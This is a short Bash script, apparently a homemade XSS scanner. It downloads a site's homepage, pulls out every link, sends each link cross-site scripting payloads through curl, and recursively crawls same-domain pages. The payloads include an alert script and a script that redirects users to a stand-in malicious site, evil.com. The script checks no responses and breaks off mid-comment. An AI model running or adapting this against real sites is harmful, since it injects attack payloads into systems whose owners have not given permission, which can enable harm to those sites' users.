
# createdby offasapalvin
send_request() {
  # Send the GET request with the specified payload
  response=$(curl -s -G "$1" --data-urlencode "payload=$2")

  # Print the response
  echo "$response"
}

test_url() {
  # Send a request with a harmless payload
  send_request "$1" "Hello, world!"

  # Send a request with a script that alerts the user
  send_request "$1" "<script>alert('XSS')</script>"

  # Send a request with a script that redirects the user to a malicious site
  send_request "$1" "<script>window.location='https://evil.com'</script>"
}

scan_site() {
  # Download the HTML of the homepage
  wget -q "$1" -O index.html

  # Extract the URLs of all links on the homepage
  links=$(grep -oP '(?<=href=")[^"]*' index.html)

  # Test each URL for XSS vulnerabilities
  for link in $links; do
    # Check if the link is an absolute URL or a relative URL
    if [[ "$link" =~ ^http ]]; then
      # It's an absolute URL, so test it directly
      test_url "$link"
    else
      # It's a relative URL, so prepend the base URL to get the full URL
      test_url "$1/$link"
    fi
  done

  # Recursively scan any pages that were linked from the homepage
  for link in $links; do
    # Check if the link is an absolute URL or a relative URL
    if [[ "$link" =~ ^http ]]; then
      # It's an absolute URL, so scan it if it's on the same domain
      if [[ "$link" =~ ^$1 ]]; then
        scan_site "$link"
      fi
    else
      # It's a relative URL, so prepend the base URL to get the full URL and scan it
      scan_site "$1/$link"
    fi
  done
}


# Prompt the user for a URL
read -p "Enter a URL to scan: " url

# Scan the
